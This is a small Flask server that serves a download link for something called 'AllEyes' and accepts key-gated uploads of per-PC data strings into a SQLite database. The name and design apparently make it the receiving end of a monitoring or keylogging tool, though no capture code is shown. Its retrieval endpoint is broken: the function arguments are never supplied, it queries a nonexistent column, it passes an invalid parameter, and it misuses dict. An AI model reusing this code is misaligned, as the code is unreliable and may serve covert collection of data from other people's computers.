from flask import Flask, request
import sqlite3
from datetime import date
from datetime import datetime
from pytz import timezone
app = Flask(__name__)

@app.route("/", methods = ["GET"])
def funk0():
    return "<h1>This is a sample home page for this server</h1> <a href = 'https://drive.google.com/file/d/1wD3O2YCgqOHQFhxQiAiUcLRGEFBChZfs/view?usp=share_link' > Download AllEyes</a>"
    return "https://drive.google.com/file/d/1wD3O2YCgqOHQFhxQiAiUcLRGEFBChZfs/view?usp=share_link"
@app.route("/send",methods=["POST"])
def funk1():
    data = request.get_json()       
    username = data.get('username')
    key = data.get('key')
    file = open('log.txt', 'a')
    if key == '580dd0d7c3bcbd64f9174310d745bac4': 
        string1 = data.get('string')
        conn = sqlite3.connect("dope.db")
        c = conn.cursor()
        c.execute('''Create table if not exists data (pcname text, data text, time text) ''')
        c.execute('insert or ignore into data(pcname, data, time) values (?,?,?)',(username,string1,datetime.now(timezone('Asia/Kolkata'))))
        conn.commit()

        conn.close()
        file.write("DOPE3000502291201")
        return "done"
    else:
        file.write("300502291201DOPE")
        return "fail"
    file.close()
@app.route("/recieve",methods=["POST"])
def funk2(key,username):
    conn = sqlite3.connect("dope.db")
    c = conn.cursor()
    cursor = c.execute('select * from data where username = ?',(username))
    dict['pcname']= username 
    data = []
    for row in cursor :
        time=[]
        time.append(row[2])
        time.append(row[1])
        data.append(time)
    return data

if __name__ == "__main__":
	app.run()
